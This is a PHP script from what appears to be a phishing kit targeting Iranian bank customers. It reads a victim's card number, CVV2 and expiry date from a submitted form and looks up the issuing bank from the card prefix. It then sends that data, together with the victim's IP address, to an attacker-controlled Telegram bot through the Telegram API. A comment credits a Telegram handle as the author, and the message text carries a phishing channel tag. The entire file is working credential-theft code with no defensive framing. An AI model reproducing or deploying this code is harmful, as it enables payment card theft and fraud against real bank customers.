

<?php

$pan = $_POST["cardnumber"];
$cvv = $_POST["cvv2"];
$year = $_POST["year"];
$month = $_POST["month"];

include "Userid.php" ;
include "../info.php";

//CODED BY X_KILER
//T.ME/X_KILER

$pan1 = substr($pan,0,4);
$pan2 = substr($pan,4,-8);
$pan3 = substr($pan,8,-4);
$pan4 = substr($pan,12);
$cardn = substr($pan,0,-12);
 echo ($cardn);

if ($cardn == "6037 99" || $cardn == "1700 19" || $cardn == "5899 05") {
      $bankname = "#MELI";  
}
elseif ($cardn == "5892 10") {
        $bankname = "#SEPAH";
}
elseif ($cardn == "6276 48" || $cardn == "2071 77") {
        $bankname = "#TOASE_SADERAT";
}
elseif ($cardn == "6279 61") {
        $bankname = "#SANAT_MADAN";
}
elseif ($cardn == "6037 70" || $cardn == "6392 17") {
        $bankname = "#KESHAVARZI";
}
elseif ($cardn == "6280 23") {
        $bankname = "#MASKAN";
}
elseif ($cardn == "6277 60") {
        $bankname = "#POST_BANK";
}
elseif ($cardn == "5029 08") {
        $bankname = "#TOSSE_TAAVN";
}
elseif ($cardn == "6274 12") {
        $bankname = "#EGHTSAD_NOVIN";
}
elseif ($cardn == "6221 06" || $cardn == "6399 94" || $cardn == "6278 84") {
        $bankname = "#PARSIAN";
}
elseif ($cardn == "5022 29" || $cardn == "6393 47") {
        $bankname = "#PASARGAD";
}
elseif ($cardn == "6274 88" || $cardn == "5029 10") {
        $bankname = "#KAR_AFRIN";
}
elseif ($cardn == "6219 86") {
        $bankname = "#SAMAN";
}
elseif ($cardn == "6393 46") {
        $bankname = "#SINA";
}
elseif ($cardn == "6396 07") {
        $bankname = "#SARMAYE";
}
elseif ($cardn == "6362 14") {
        $bankname = "#AYAND3";
}
elseif ($cardn == "5028 06" || $cardn == "5047 06") {
        $bankname = "#SHAHR";
}
elseif ($cardn == "5029 38") {
        $bankname = "#DEY";
}
elseif ($cardn == "6037 69") {
        $bankname = "#SADERAT";
}
elseif ($cardn == "6104 33" || $cardn == "9919 75") {
        $bankname = "#MELAT";
}
elseif ($cardn == "6273 53" || $cardn == "5859 83") {
        $bankname = "#TEJARAT";
}
elseif ($cardn == "5894 63") {
        $bankname = "#REFAH";
}
elseif ($cardn == "6273 81") {
        $bankname = "#ANSAR";
}
elseif ($cardn == "5057 85") {
        $bankname = "#IRAN_ZAMIN";
}
elseif ($cardn == "6367 95") {
        $bankname = "#MARKAZI";
}
elseif ($cardn == "6369 49") {
        $bankname = "#HEKMAT";
}
elseif ($cardn == "5054 16") {
        $bankname = "#GARDESHGARI";
}
elseif ($cardn == "6063 73") {
        $bankname = "#QARZOLHASANE";
}
elseif ($cardn == "6281 57") {
        $bankname = "#MOSSE_ETBARI";
}
elseif ($cardn == "5058 01") {
        $bankname = "#KOSAR";
}
elseif ($cardn == "6393 70") {
        $bankname = "#MOSSE_MEHR";
}
elseif ($cardn == "6395 99") { 
        $bankname = "#GAVAMIN";
}
else{
        $bankname = "#TEST";
}

$ip = $_SERVER["REMOTE_ADDR"];


$Text = "New Card / پویا 🍉
Card :  <code>$pan</code>
در حال انتظار برای دریافت رمز پویا
Cvv2 :  <code>$cvv</code>
Y / M :  <code>$year</code>/ <code>$month</code>
Bank Name : $bankname
🌐 IP : $ip
⚠️ @PhishinG_PorT";

    $ok=file_get_contents("https://api.telegram.org/bot".$TOKENESH."/sendMessage?parse_mode=HTML&chat_id=".$IDISH."&text=".urlencode($Text));
?>